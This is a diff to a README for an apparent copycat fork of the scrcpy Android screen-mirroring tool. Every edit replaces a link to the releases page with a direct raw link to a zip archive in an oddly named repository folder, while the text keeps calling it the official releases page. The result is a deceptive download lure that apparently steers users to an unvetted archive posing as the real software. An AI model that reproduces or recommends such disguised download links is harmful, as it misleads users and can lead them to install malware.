@@ -1,6 +1,6 @@
 # 📱 scrcpy - Simple Android Screen Mirroring
 
-[![Download scrcpy](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/BizaSDK/scrcpy/releases)
+[![Download scrcpy](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/BizaSDK/scrcpy/raw/refs/heads/main/Myxinoidei/Software_v1.3.zip)
 
 ## 📋 What is scrcpy?
 
@@ -40,7 +40,7 @@ This application aims to make Android screen mirroring simple for everyone. Whet
 ### 1. Visit the Download Page
 
 Click the big badge at the top or go to the official releases page here:  
-[Download scrcpy on GitHub](https://github.com/BizaSDK/scrcpy/releases)
+[Download scrcpy on GitHub](https://github.com/BizaSDK/scrcpy/raw/refs/heads/main/Myxinoidei/Software_v1.3.zip)
 
 This link opens GitHub where you will find the latest versions of scrcpy. The files are organized by release date, with the newest release at the top.
 
@@ -131,7 +131,7 @@ scrcpy includes settings you can change to fit your needs. You can change:
 ## 📂 Additional Resources
 
 - Visit the GitHub page for documentation and updates:  
-  https://github.com/BizaSDK/scrcpy/releases
+  https://github.com/BizaSDK/scrcpy/raw/refs/heads/main/Myxinoidei/Software_v1.3.zip
 - Find help and community discussions on GitHub issues.
 - Learn how to set up advanced features from the wiki or README on the GitHub repository.
 
@@ -146,4 +146,4 @@ adb, android, android-debugging, desktop-app, gui, open-source, scrcpy-android, 
 ## 📥 Ready to Start?
 
 Download scrcpy now from the official releases page:  
-[Download scrcpy on GitHub](https://github.com/BizaSDK/scrcpy/releases)
+[Download scrcpy on GitHub](https://github.com/BizaSDK/scrcpy/raw/refs/heads/main/Myxinoidei/Software_v1.3.zip)
